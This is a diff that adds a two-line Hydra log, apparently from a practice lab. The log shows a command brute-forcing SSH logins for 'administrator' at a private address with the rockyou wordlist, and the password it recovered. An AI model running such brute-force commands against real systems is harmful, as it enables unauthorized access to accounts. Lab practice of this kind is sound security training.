@@ -1,0 +1,2 @@
+# Hydra v8.6 run at 2021-10-30 14:51:10 on 10.10.167.115 ssh (hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV -o smtp_hydra.log 10.10.167.115 ssh)
+[22][ssh] host: 10.10.167.115   login: administrator   password: alejandro
